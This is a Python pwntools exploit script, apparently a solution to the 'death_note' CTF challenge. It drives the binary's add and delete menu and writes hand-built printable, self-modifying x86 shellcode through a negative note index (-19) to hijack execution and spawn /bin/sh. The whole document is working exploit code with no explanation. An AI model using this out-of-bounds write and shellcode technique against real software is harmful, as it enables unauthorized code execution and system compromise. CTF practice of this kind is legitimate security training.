from pwn import *
io=process("./death_note")

def add(index,name):
    io.sendlineafter("Your choice :","1")
    io.sendlineafter("Index :",str(index))
    io.sendlineafter("Name :",name)

def view(index):
    io.sendlineafter("Your choice :","2")
    io.sendlineafter("Index :",str(index))

def delete(index):
    io.sendlineafter("Your choice :","3")
    io.sendlineafter("Index :",str(index))
shellcode=asm("""
              push edx
              push 0x68732f2f
              push 0x6e69622f
              push esp
              pop ebx
              push 0x61
              pop ecx
              xor BYTE PTR [eax+73],cl
              xor BYTE PTR [eax+74],cl
              xor BYTE PTR [eax+55],cl
              push 126
              pop ecx
              inc ecx
              inc ecx
              xor BYTE PTR [eax+73],cl
              xor BYTE PTR [eax+74],cl
              push 77
              pop ecx
""")
shellcode=shellcode+"aHI"
shell2=asm("""
              push edx
              pop eax
              inc eax
              inc eax
              inc eax
              inc eax
              inc eax
              inc eax
              inc eax
              inc eax
              inc eax
              inc eax
              inc eax
              push edx
              pop ecx
              .byte 0x61
              .byte 0x61
""")
shellcode=shellcode+shell2
print shellcode
add(0,"a"*0x61)
print len(shellcode)
delete(0)
add(0,"aaa")
gdb.attach(io)
add(-19,shellcode)
io.interactive()
